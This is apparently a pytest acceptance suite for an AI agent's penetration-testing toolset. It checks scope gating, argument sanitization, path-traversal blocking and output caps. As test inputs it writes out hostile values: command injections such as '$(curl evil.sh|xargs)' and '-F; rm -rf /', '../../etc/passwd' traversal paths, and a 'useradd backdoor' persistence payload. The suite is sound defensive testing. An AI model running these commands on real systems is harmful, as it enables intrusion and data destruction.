"""P3 acceptance — REFACTOR-05 (the VAPT toolset).

Oracle anchors: network_tools.py (N5 sanitization, scope gate,
structured parse fallback), passive_scanner.py (the pattern batteries),
system_tools_v2.py execute_code/execute_exploit_script (bounded
harness + PoC-only battery), mobile_tools.py (the analyze_apk
traversal class the gate closes), web_tools_v2.py (http surface).

Acceptance per the card: oracle-parity fixtures pass inside scope and
are refused outside it; traversal payloads rejected; output caps
enforced with truncation markers.
"""
import asyncio
import json
import sys
import zipfile
from pathlib import Path

import pytest

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent))

from hypervisor.adapters.openai import frozen_json  # noqa: E402
from hypervisor.permissions import (PermissionEngine,  # noqa: E402
                                    ScopeFile, ScopeManager)
from hypervisor.tools.base import ToolContext, dispatch_tools  # noqa: E402
from hypervisor.tools.core import build_registry  # noqa: E402
from hypervisor.tools.vapt.recon import PassiveScanner  # noqa: E402


@pytest.fixture()
def env(tmp_path):
    scope = {
        "version": 1, "engagement_id": "T", "mode": "strict",
        "targets": [{"target": "10.10.0.0/24"},
                    {"target": "*.target.com"}],
        "excludes": ["10.10.0.1"], "roe": {"poc_only": True},
    }
    import hashlib
    fp = hashlib.sha256(frozen_json(scope).encode()).hexdigest()
    scope["authorization"] = {"signed_sha256": fp}
    d = Path(tmp_path) / "scope"
    d.mkdir()
    (d / "scope.json").write_text(json.dumps(scope))
    sm = ScopeManager(ScopeFile.load(d / "scope.json"))
    ws = Path(tmp_path) / "ws"
    ws.mkdir()
    reg = build_registry(include_vapt=True, include_task=True)
    ctx = ToolContext(workspace=str(ws), registry=reg,
                      permissions=PermissionEngine(sm))
    return ctx, reg, sm, ws


def call(ctx, name, args, cid="c1"):
    return asyncio.run(dispatch_tools(
        [{"type": "tool_use", "id": cid, "name": name, "input": args}],
        ctx))[0]


# ─── nmap: N5 argument sanitization (oracle parity) ────────────────────

def test_nmap_rejects_command_substitution_and_metachars(env):
    ctx, reg, sm, ws = env
    for bad in ("$(curl evil.sh|xargs)", "`id`", "-F; rm -rf /",
                "-F & echo hi", "-F\n-sS", "-F$HOME"):
        res = call(ctx, "network_scan_nmap",
                   {"target": "10.10.0.5", "arguments": bad})
        assert res["is_error"], bad
        assert "Illegal characters" in res["content"], bad


def test_nmap_out_of_scope_target_denied(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "network_scan_nmap",
               {"target": "192.168.77.77", "arguments": "-F"})
    assert res["is_error"]
    assert "PERMISSION DENIED" in res["content"]
    assert "out of scope" in res["content"]


def test_nmap_in_scope_runs_and_parses(env, monkeypatch):
    """In-scope scan with a stubbed nmap binary: the structured parse
    extracts host/port records, the raw output rides along."""
    ctx, reg, sm, ws = env
    fake = ws / "fakebin"
    fake.mkdir()
    (fake / "nmap").write_text(
        "#!/bin/sh\n"
        "echo 'Starting Nmap 7.94'\n"
        "echo 'Nmap scan report for web01 (10.10.0.5)'\n"
        "echo 'Host is up (0.001s latency).'\n"
        "echo 'PORT     STATE SERVICE VERSION'\n"
        "echo '22/tcp   open  ssh     OpenSSH 8.9p1'\n"
        "echo '80/tcp   open  http    nginx 1.24.0'\n")
    (fake / "nmap").chmod(0o755)
    monkeypatch.setenv("PATH", f"{fake}:{__import__('os').environ['PATH']}")
    res = call(ctx, "network_scan_nmap",
               {"target": "10.10.0.5", "arguments": "-F"})
    assert not res["is_error"], res["content"]
    assert "Nmap structured parse" in res["content"]
    body = json.loads(res["content"].split("Nmap structured parse:\n")[1]
                      .split("--- raw output ---")[0])
    assert body[0]["hostname"] == "web01"
    assert body[0]["address"] == "10.10.0.5"
    ports = {p["port"]: p["service"] for p in body[0]["ports"]}
    assert ports["22/tcp"] == "ssh"
    assert ports["80/tcp"] == "http"


def test_nmap_raw_fallback_when_unparseable(env, monkeypatch):
    ctx, reg, sm, ws = env
    fake = ws / "fakebin2"
    fake.mkdir()
    (fake / "nmap").write_text("#!/bin/sh\necho 'nmap: some error text'\n")
    (fake / "nmap").chmod(0o755)
    monkeypatch.setenv("PATH", f"{fake}:{__import__('os').environ['PATH']}")
    res = call(ctx, "network_scan_nmap",
               {"target": "10.10.0.5", "arguments": "-F"})
    assert "raw fallback" in res["content"]


# ─── the passive scanner battery (oracle pattern parity) ───────────────

def test_passive_scanner_battery_finds_oracle_classes():
    text = ("Server: Apache/2.4.49\n"
            "Warning: mysql_fetch_array(): SQL syntax error\n"
            "AKIAIOSFODNN7EXAMPLE\n"
            "Traceback (most recent call last):\n"
            "/.git/config exposed\n"
            "android:debuggable=\"true\"\n"
            "DES cipher in use\n")
    alerts = PassiveScanner.scan_text(text)
    joined = "\n".join(alerts)
    assert "[VULN] VERSION_DISCLOSURE" in joined
    assert "Apache/2.4.49" in joined
    assert "[VULN] SQL_ERROR_LEAK" in joined
    assert "[CRITICAL] SECRET_EXPOSED: AWS Access Key" in joined
    assert "[VULN] STACK_TRACE: Python Stack Trace" in joined
    assert "[API] Sensitive File Exposure" in joined
    assert "[MOBILE] Debuggable Android App" in joined
    assert "[VULN] CRYPTO_WEAKNESS" in joined


def test_passive_scanner_headers_missing_security_headers():
    alerts = PassiveScanner.scan_headers(
        {"Server": "nginx 1.24.0",
         "Access-Control-Allow-Origin": "*"})
    joined = "\n".join(alerts)
    assert "MISSING_HEADER" in joined
    assert "CORS_WILDCARD" in joined
    assert "SERVER_VERSION" in joined


def test_passive_scan_tool_reads_workspace_file(env):
    ctx, reg, sm, ws = env
    (ws / "notes.txt").write_text(
        "db password = 'hunter2secret'\nServer: Apache/2.4.49")
    res = call(ctx, "passive_scan", {"file": "notes.txt"})
    assert not res["is_error"]
    assert "VERSION_DISCLOSURE" in res["content"]
    # traversal: the gate refuses before the tool runs
    res2 = call(ctx, "passive_scan",
                {"file": "../../etc/passwd"})
    assert res2["is_error"]
    assert "escapes the engagement workspace" in res2["content"]


# ─── http surface: scope on host, method classes ───────────────────────

def test_http_request_out_of_scope_host_denied(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "advanced_http_request",
               {"url": "http://192.168.77.77/admin"})
    assert res["is_error"]
    assert "PERMISSION DENIED" in res["content"]


def test_http_request_bad_url_and_headers_validated(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "advanced_http_request", {"url": "ftp://xyz"})
    assert res["is_error"] and "http(s)" in res["content"]
    res2 = call(ctx, "advanced_http_request",
                {"url": "http://app.target.com/", "headers": "{oops"})
    assert res2["is_error"] and "JSON object" in res2["content"]


def test_http_request_in_scope_against_local_server(env):
    """A real socket-level HTTP call: out-of-scope under the strict
    scope, allowed under a permissive one, response rendered + the
    passive scanner rides the body."""
    import hashlib
    import http.server
    import threading

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = b"hello from target"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Server", "Apache/2.4.49")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    port = srv.server_port
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        ctx, reg, sm, ws = env
        # 127.0.0.1 is not in the strict scope -> denied
        res = call(ctx, "advanced_http_request",
                   {"url": f"http://127.0.0.1:{port}/"})
        assert res["is_error"]
        assert "PERMISSION DENIED" in res["content"]
        # permissive scope -> allowed
        permissive = {
            "version": 1, "engagement_id": "P", "mode": "permissive",
            "targets": [{"target": "127.0.0.1"}], "excludes": [],
            "roe": {"poc_only": True},
        }
        fp = hashlib.sha256(
            frozen_json(permissive).encode()).hexdigest()
        permissive["authorization"] = {"signed_sha256": fp}
        sd = ws / "perm"
        sd.mkdir(exist_ok=True)
        (sd / "s.json").write_text(json.dumps(permissive))
        ctx.permissions = PermissionEngine(
            ScopeManager(ScopeFile.load(sd / "s.json")))
        res2 = call(ctx, "advanced_http_request",
                    {"url": f"http://127.0.0.1:{port}/"})
        assert not res2["is_error"], res2["content"]
        assert "HTTP 200" in res2["content"]
        assert "hello from target" in res2["content"]
        assert "passive scanner alerts" in res2["content"]
        assert "[VULN] SERVER_VERSION" in res2["content"]
        assert "MISSING_HEADER" in res2["content"]
    finally:
        srv.shutdown()


# ─── OOB pair ──────────────────────────────────────────────────────────

def test_oob_payload_and_poll_roundtrip(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "generate_oob_payload", {"tag": "sqli"})
    assert not res["is_error"]
    payload = json.loads(res["content"])
    assert payload["tag"].startswith("sqli-")
    assert payload["payload"].endswith(payload["domain"])
    # no interactions yet
    res2 = call(ctx, "poll_oob_interactions", {})
    assert "No OOB interactions" in res2["content"]
    # the receiver writes a log; the poll reports it
    ob = ws / "oob"
    ob.mkdir(exist_ok=True)
    (ob / f"{payload['tag']}.log").write_text(
        json.dumps({"src": "10.10.0.9", "detail": "dns hit"}) + "\n")
    res3 = call(ctx, "poll_oob_interactions", {})
    assert "dns hit" in res3["content"]


# ─── exec harness: bounded, capped, PoC-only battery ────────────────────

def test_execute_code_runs_and_reports_exit_code(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "execute_code",
               {"python_code": "print('hello from code tool')\n"
                               "print('to stderr', file=__import__('sys')"
                               ".stderr)"})
    assert not res["is_error"]
    assert "hello from code tool" in res["content"]


def test_execute_code_out_of_scope_network_denied(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "execute_code",
               {"python_code": "import urllib.request\n"
                               "urllib.request.urlopen('http://"
                               "192.168.77.77/')"})
    assert res["is_error"]
    assert "out of scope" in res["content"]


def test_execute_exploit_script_refuses_persistent_payload(env):
    """PoC-only RoE: the persistence battery refuses before
    execution (oracle execute_exploit_script parity)."""
    ctx, reg, sm, ws = env
    res = call(ctx, "execute_exploit_script",
               {"python_code": "import subprocess\n"
                               "subprocess.run(['useradd', 'backdoor'])\n"
                               "print('poc')"})
    assert res["is_error"]
    assert "roe:poc-only" in res["content"]


def test_execute_code_timeout_kills_process_group(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "execute_code",
               {"python_code": "import time\nwhile True: time.sleep(1)",
                "timeout": 1})
    assert res["is_error"]
    assert "wall-clock bound" in res["content"]


# ─── mobile static analysis: the traversal class ───────────────────────

def _make_apk(path: Path):
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("AndroidManifest.xml",
                    "android.permission.INTERNET "
                    "android.permission.CAMERA "
                    "com.example.vulnerable.app "
                    "android:debuggable=\"true\" "
                    "android:allowBackup=\"true\"")
        zf.writestr("classes.dex", b"\xde\xad\xbe\xef" * 64)
        zf.writestr("res/config.properties",
                    "api_url=https://api.target.com/v1\n"
                    "api_key=abcdefghijklmnopqrstuvwxyz123456\n")
        zf.writestr("assets/notes.txt",
                    "Server: Apache/2.4.49\nssh root@10.10.0.5")


def test_analyze_apk_static_analysis_and_traversal(env):
    ctx, reg, sm, ws = env
    apk = ws / "app.apk"
    _make_apk(apk)
    res = call(ctx, "analyze_apk", {"apk_path": "app.apk"})
    assert not res["is_error"], res["content"]
    report = json.loads(res["content"])
    assert report["package"] == "com.example.vulnerable.app"
    assert "android.permission.INTERNET".replace(
        "android.permission.", "") not in report.get(
        "permissions", []) or "INTERNET" in report.get(
        "permissions", [])
    assert "INTERNET" in report["permissions"]
    assert "CAMERA" in report["permissions"]
    assert any("target.com" in u for u in report["embedded_urls"])
    assert report["security_alerts"]
    assert report["sha256"] and len(report["sha256"]) == 64
    # traversal: the raw-join class is closed at gate time
    for bad in ("../../etc/passwd", "sub/../../../app.apk"):
        res2 = call(ctx, "analyze_apk", {"apk_path": bad})
        assert res2["is_error"], bad
        assert ("escapes the engagement workspace"
                in res2["content"]
                or "PERMISSION DENIED" in res2["content"]), bad


# ─── local analysis tools ──────────────────────────────────────────────

def test_entropy_tool_assessment(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "analyze_entropy", {"data_string": "a" * 200})
    out = json.loads(res["content"])
    assert out["shannon_entropy_bits_per_char"] == 0.0
    assert out["assessment"].startswith("low")
    res2 = call(ctx, "analyze_entropy",
                {"data_string":
                 "8fJk2LpQ9xZv4RnM7cBw6HsT1yGd3AeU"})
    out2 = json.loads(res2["content"])
    assert out2["shannon_entropy_bits_per_char"] > 4.0


def test_crypto_tool_xor_and_refuses_block_ciphers(env):
    ctx, reg, sm, ws = env
    # xor round-trip
    secret = "attack at dawn"
    key = "lemon"
    cipher = "".join(chr(ord(a) ^ ord(b)) for a, b in
                     zip(secret, key * 5))
    res = call(ctx, "crypto_analyzer",
               {"ciphertext": cipher, "key_string": key,
                "algorithm": "xor"})
    out = json.loads(res["content"])
    assert out["result"] == secret
    assert out["assessment"] == "likely correct"
    # block ciphers are refused at the schema (not in the supported
    # enum — the stdlib-only harness has no crypto library)
    res2 = call(ctx, "crypto_analyzer",
                {"ciphertext": "x" * 32, "algorithm": "aes"})
    assert res2["is_error"]
    assert ("not in enum" in res2["content"]
            or "unsupported algorithm" in res2["content"])


def test_sequential_thinking_shape(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "sequential_thinking",
               {"thought": "step one", "next_thought_needed": True,
                "thought_number": 1, "total_thoughts": 3})
    out = json.loads(res["content"])
    assert out["status"] == "continue"
    res2 = call(ctx, "sequential_thinking",
                {"thought": "final", "next_thought_needed": False,
                 "thought_number": 3, "total_thoughts": 3})
    assert json.loads(res2["content"])["status"] == "complete"


def test_check_port_listener_local(env):
    ctx, reg, sm, ws = env
    res = call(ctx, "check_port_listener", {"port": 1})
    out = json.loads(res["content"])
    assert out == {"port": 1, "listening": False}


# ─── the report compiler ───────────────────────────────────────────────

def test_compile_report_evidence_chained(env):
    ctx, reg, sm, ws = env
    from hypervisor.memory.ekd import EngagementDAG
    from hypervisor.memory.extractors import ensure_objective
    ekd = EngagementDAG()
    ensure_objective(ekd, "own the box")
    ctx.extra["ekd"] = ekd
    from hypervisor.memory.ekd import DAGNode, EkdBatch
    with EkdBatch(ekd, ctx, extractor="tier_a", reason="seed"):
        ekd.add(DAGNode(id="", type="finding",
                        key="finding:sqli", title="SQLi /search",
                        attrs={"severity": "critical",
                               "description": "union select"}))
    res = call(ctx, "compile_report", {})
    assert not res["is_error"], res["content"]
    out = json.loads(res["content"])
    assert out["findings"] == 1
    written = (ws / "report.md").read_text()
    assert "AEGIS Engagement Report" in written
    assert "SQLi /search" in written
    assert "CRITICAL" in written.upper()
    assert "own the box" in written
    # the finding id rides the report (traceability)
    fid = next(iter(ekd.nodes_of_type("finding"))).id
    assert fid in written


def test_output_caps_enforced_with_truncation_marker(env):
    """B2 discipline through the shared render path: oversized tool
    output lands capped with the buffer pointer advertised."""
    ctx, reg, sm, ws = env
    big = "x" * 30000
    res = call(ctx, "execute_code",
               {"python_code": f"print({big!r})"})
    assert "OUTPUT TRUNCATED" in res["content"]
    assert "Buffer: workspace/buffers/" in res["content"]
    # the buffer file exists whole
    import glob
    bufs = list((ws / "buffers").glob("agent_buffer_*.log"))
    assert bufs and len(bufs[0].read_text()) >= 30000
